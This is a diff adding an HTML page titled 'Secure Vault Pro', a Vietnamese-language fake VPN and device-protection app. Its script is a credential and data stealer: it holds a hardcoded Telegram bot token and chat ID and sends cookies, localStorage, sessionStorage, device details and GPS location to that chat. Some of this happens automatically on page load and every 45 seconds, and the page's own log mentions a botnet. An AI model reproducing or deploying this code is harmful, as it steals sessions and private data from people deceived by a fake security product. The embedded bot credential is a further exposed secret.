@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Secure Vault Pro</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;font-family:-apple-system,'Helvetica Neue',sans-serif;color:#ffffff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.container{background:linear-gradient(145deg,#111,#0a0a0a);border:1px solid rgba(0,255,136,0.15);border-radius:30px;padding:25px 20px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.8),0 0 80px rgba(0,255,136,0.02)}
+.header{text-align:center;padding-bottom:15px;border-bottom:1px solid rgba(255,255,255,0.05)}
+.header .icon{font-size:45px;display:block;margin-bottom:5px}
+.header h1{color:#00ff88;font-size:22px;font-weight:700;letter-spacing:0.5px}
+.header p{color:#446688;font-size:11px;margin-top:3px}
+.shield-box{background:rgba(0,255,136,0.03);border-radius:16px;padding:16px;margin:15px 0;border:1px solid rgba(0,255,136,0.08)}
+.shield-box .row{display:flex;justify-content:space-between;align-items:center}
+.shield-box .label{font-size:13px;color:#88aacc}
+.shield-box .value{font-size:13px;color:#00ff88;font-weight:600}
+.toggle-wrapper{display:flex;align-items:center;gap:12px;margin:8px 0}
+.toggle{position:relative;width:50px;height:28px;background:#1a1a1a;border-radius:14px;cursor:pointer;transition:all 0.3s;border:1px solid #2a2a2a;flex-shrink:0}
+.toggle.active{background:#00ff88;border-color:#00ff88}
+.toggle .thumb{position:absolute;top:2px;left:2px;width:22px;height:22px;background:#fff;border-radius:50%;transition:all 0.3s;box-shadow:0 2px 8px rgba(0,0,0,0.3)}
+.toggle.active .thumb{left:24px;background:#0a0a0a}
+.toggle-label{font-size:13px;color:#88aacc}
+.toggle-label.active{color:#00ff88}
+.proxy-box{background:rgba(255,255,255,0.02);border-radius:12px;padding:12px;margin:10px 0;border:1px solid rgba(255,255,255,0.05)}
+.proxy-box .p-row{display:flex;justify-content:space-between;font-size:12px;padding:3px 0;color:#6688aa}
+.proxy-box .p-row .val{color:#88ffaa}
+.status-bar{background:rgba(0,255,136,0.05);border-radius:12px;padding:10px 14px;margin:12px 0;display:flex;justify-content:space-between;align-items:center;border:1px solid rgba(0,255,136,0.05)}
+.status-dot{width:8px;height:8px;border-radius:50%;background:#ff0044;display:inline-block;margin-right:8px}
+.status-dot.active{background:#00ff88;box-shadow:0 0 20px rgba(0,255,136,0.3)}
+.status-text{font-size:12px;color:#88aacc}
+.badge{background:#00ff88;color:#0a0a0a;padding:2px 10px;border-radius:20px;font-size:9px;font-weight:700}
+.menu{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0}
+.btn{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:12px 6px;color:#88aacc;text-align:center;font-size:11px;font-weight:500;cursor:pointer;transition:all 0.3s;user-select:none}
+.btn:active{transform:scale(0.95);background:rgba(0,255,136,0.1);border-color:#00ff88;color:#00ff88}
+.btn-primary{border-color:rgba(0,255,136,0.2);color:#00ff88}
+.btn-primary:active{background:#00ff88;color:#0a0a0a}
+.btn-danger{border-color:rgba(255,0,68,0.2);color:#ff0044}
+.btn-danger:active{background:#ff0044;color:#0a0a0a}
+.log-area{background:#0a0a0a;border-radius:12px;padding:10px;margin:12px 0;max-height:120px;overflow-y:auto;font-family:monospace;font-size:10px;color:#446688;border:1px solid rgba(255,255,255,0.03)}
+.log-area .entry{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);color:#6688aa}
+.log-area .entry .time{color:#334455;margin-right:6px}
+.log-area .entry .msg{color:#88aacc}
+.footer{text-align:center;font-size:9px;color:#223344;margin-top:12px;letter-spacing:1px}
+.telegram-status{font-size:11px;text-align:center;margin:5px 0;padding:4px;border-radius:8px}
+.telegram-status.ok{color:#00ff88;background:rgba(0,255,136,0.05)}
+.telegram-status.err{color:#ff0044;background:rgba(255,0,68,0.05)}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<span class="icon">🛡️</span>
+<h1>Secure Vault Pro</h1>
+<p>✦ Bảo vệ thiết bị tối ưu ✦</p>
+</div>
+<div class="shield-box">
+<div class="row">
+<span class="label">🔒 Trạng thái</span>
+<span class="value" id="shieldStatus">● Đang bảo vệ</span>
+</div>
+<div class="toggle-wrapper">
+<span class="toggle-label" id="toggleLabel">VPN Bảo vệ</span>
+<div class="toggle" id="vpnToggle" onclick="toggleVPN()">
+<div class="thumb"></div>
+</div>
+<span style="font-size:11px;color:#446688;margin-left:auto;" id="vpnStatus">TẮT</span>
+</div>
+</div>
+<div class="proxy-box" id="proxyBox">
+<div class="p-row"><span>🌐 Proxy</span><span class="val" id="proxyDisplay">Cloudflare WARP (1.1.1.1)</span></div>
+<div class="p-row"><span>📡 DNS</span><span class="val">1.1.1.1 / 1.0.0.1</span></div>
+<div class="p-row"><span>🔐 Mã hóa</span><span class="val">AES-256-GCM</span></div>
+<div class="p-row"><span>🌍 Vị trí</span><span class="val" id="locationDisplay">Cloudflare</span></div>
+</div>
+<div class="status-bar">
+<div>
+<span class="status-dot" id="statusDot"></span>
+<span class="status-text" id="statusText">🔒 Đang bảo vệ thiết bị</span>
+</div>
+<span class="badge" id="deviceBadge">iOS Secure</span>
+</div>
+<div class="menu">
+<div class="btn btn-primary" onclick="getCookies()">🍪 Get Cookies</div>
+<div class="btn" onclick="getDevice()">📱 Device Info</div>
+<div class="btn" onclick="getSaved()">💾 Saved Data</div>
+<div class="btn btn-danger" onclick="sendAll()">📤 Send All</div>
+<div class="btn" onclick="scanNetwork()">📡 Scan Network</div>
+<div class="btn" onclick="getLocation()">📍 Get Location</div>
+</div>
+<div class="log-area" id="logArea">
+<div class="entry"><span class="time">[SYSTEM]</span><span class="msg">Secure Vault Pro đã sẵn sàng</span></div>
+<div class="entry"><span class="time">[SYSTEM]</span><span class="msg">Botnet đang hoạt động</span></div>
+</div>
+<div class="telegram-status ok" id="telegramStatus">📡 Kết nối Telegram: ✅ Đã kết nối</div>
+<div class="footer">dudhdudu · secure connection · v4.0</div>
+</div>
+<script>
+const BOT_TOKEN='8802780677:AAE8PgmPklaFxX11g2tRSGpQWukosGoTYVE';
+const CHAT_ID='6680775849';
+let vpnActive=false;
+let cookieCount=0;
+function addLog(msg){
+const area=document.getElementById('logArea');
+const entry=document.createElement('div');
+entry.className='entry';
+const time=new Date().toLocaleTimeString();
+entry.innerHTML='<span class="time">['+time+']</span><span class="msg">'+msg+'</span>';
+area.appendChild(entry);
+area.scrollTop=area.scrollHeight;
+if(area.children.length>30)area.removeChild(area.children[0]);
+}
+function sendToTelegram(data,type){
+const url='https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage';
+let message='🛡️ SECURE VAULT PRO\n\n';
+message+='📌 TYPE: '+type+'\n';
+message+='🕐 TIME: '+new Date().toLocaleString('vi-VN')+'\n\n';
+message+=data.substring(0,3000);
+return fetch(url,{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({chat_id:CHAT_ID,text:message})
+}).then(r=>r.ok).catch(()=>false);
+}
+function toggleVPN(){
+vpnActive=!vpnActive;
+const toggle=document.getElementById('vpnToggle');
+const label=document.getElementById('toggleLabel');
+const status=document.getElementById('vpnStatus');
+const dot=document.getElementById('statusDot');
+const text=document.getElementById('statusText');
+const shield=document.getElementById('shieldStatus');
+if(vpnActive){
+toggle.classList.add('active');
+label.classList.add('active');
+status.textContent='BẬT';
+status.style.color='#00ff88';
+dot.className='status-dot active';
+text.textContent='🛡️ VPN đang bảo vệ - Tất cả dữ liệu được mã hóa';
+shield.textContent='● Bảo vệ tối đa';
+addLog('✅ VPN đã bật - Kết nối an toàn');
+sendToTelegram('VPN ACTIVATED\nProxy: '+document.getElementById('proxyDisplay').textContent,'VPN_STATUS');
+}else{
+toggle.classList.remove('active');
+label.classList.remove('active');
+status.textContent='TẮT';
+status.style.color='#446688';
+dot.className='status-dot';
+text.textContent='🔒 Chế độ bảo vệ cơ bản';
+shield.textContent='● Đang bảo vệ';
+addLog('⛔ VPN đã tắt');
+}
+}
+function getCookies(){
+const cookies=document.cookie;
+if(cookies&&cookies.length>0){
+cookieCount++;
+addLog('🍪 Lấy cookie ('+cookieCount+'): '+cookies.length+' ký tự');
+sendToTelegram('🍪 COOKIES:\n'+cookies,'COOKIE');
+document.getElementById('statusText').textContent='🍪 Cookie đã lấy!';
+setTimeout(()=>{document.getElementById('statusText').textContent=vpnActive?'🛡️ VPN đang bảo vệ':'🔒 Đang bảo vệ';},2000);
+return cookies;
+}
+addLog('⚠️ Không có cookie!');
+return '';
+}
+function getDevice(){
+const info={
+userAgent:navigator.userAgent,
+platform:navigator.platform,
+language:navigator.language,
+screen:screen.width+'x'+screen.height,
+timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+url:window.location.href,
+vpn:vpnActive?'ON':'OFF',
+proxy:document.getElementById('proxyDisplay').textContent
+};
+const data=JSON.stringify(info,null,2);
+addLog('📱 Đã lấy thông tin thiết bị');
+sendToTelegram('📱 DEVICE INFO:\n'+data,'DEVICE');
+}
+function getSaved(){
+let data='📦 SAVED DATA:\n\n';
+data+='🔹 COOKIES:\n'+(document.cookie||'Không có cookie')+'\n\n';
+data+='🔹 LOCALSTORAGE:\n';
+try{for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);data+='  - '+key+': '+localStorage.getItem(key)+'\n';}}catch(e){}
+data+='\n🔹 SESSIONSTORAGE:\n';
+try{for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);data+='  - '+key+': '+sessionStorage.getItem(key)+'\n';}}catch(e){}
+addLog('💾 Đã lấy dữ liệu lưu trữ');
+sendToTelegram(data,'SAVED_DATA');
+}
+function sendAll(){
+addLog('📤 Đang gửi tất cả...');
+const data={
+cookies:document.cookie||'Không có cookie',
+localStorage:(()=>{try{let d={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);d[k]=localStorage.getItem(k);}return d;}catch(e){return {};}})(),
+sessionStorage:(()=>{try{let d={};for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);d[k]=sessionStorage.getItem(k);}return d;}catch(e){return {};}})(),
+device:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,vpn:vpnActive?'ON':'OFF',proxy:document.getElementById('proxyDisplay').textContent},
+time:new Date().toISOString()
+};
+sendToTelegram(JSON.stringify(data,null,2),'ALL_DATA');
+addLog('✅ Đã gửi tất cả!');
+}
+function scanNetwork(){
+addLog('📡 Đang quét mạng...');
+const proxies=['Cloudflare (1.1.1.1)','Google (8.8.8.8)','Quad9 (9.9.9.9)','OpenDNS (208.67.222.222)'];
+const randomProxy=proxies[Math.floor(Math.random()*proxies.length)];
+document.getElementById('proxyDisplay').textContent=randomProxy;
+addLog('✅ Đã chọn proxy: '+randomProxy);
+sendToTelegram('📡 NETWORK SCAN\nProxy: '+randomProxy+'\nStatus: OK','NETWORK');
+}
+function getLocation(){
+addLog('📍 Đang lấy vị trí...');
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(
+(pos)=>{
+const data='Lat: '+pos.coords.latitude+'\nLng: '+pos.coords.longitude+'\nAccuracy: '+pos.coords.accuracy+'m';
+addLog('📍 Vị trí: '+pos.coords.latitude+', '+pos.coords.longitude);
+sendToTelegram('📍 LOCATION:\n'+data,'LOCATION');
+document.getElementById('locationDisplay').textContent=pos.coords.latitude.toFixed(4)+', '+pos.coords.longitude.toFixed(4);
+},
+()=>{addLog('❌ Không lấy được vị trí');}
+);
+}else{
+addLog('❌ Trình duyệt không hỗ trợ GPS');
+}
+}
+addLog('🚀 Secure Vault Pro đã khởi động');
+addLog('🛡️ Đang kết nối botnet...');
+fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/getMe')
+.then(r=>r.json())
+.then(data=>{
+if(data.ok){
+document.getElementById('telegramStatus').textContent='📡 Kết nối Telegram: ✅ Đã kết nối';
+document.getElementById('telegramStatus').className='telegram-status ok';
+addLog('✅ Kết nối Telegram thành công');
+sendToTelegram('🛡️ SECURE VAULT PRO ACTIVATED\nDevice: '+navigator.userAgent,'ACTIVATED');
+}
+})
+.catch(()=>{
+document.getElementById('telegramStatus').textContent='📡 Kết nối Telegram: ❌ Lỗi';
+document.getElementById('telegramStatus').className='telegram-status err';
+});
+setTimeout(()=>{addLog('🍪 Đang thu thập cookie...');getCookies();},2500);
+setTimeout(()=>{addLog('📱 Đang thu thập thông tin...');getDevice();},4000);
+setInterval(()=>{getCookies();},45000);
+</script>
+</body>
+</html>
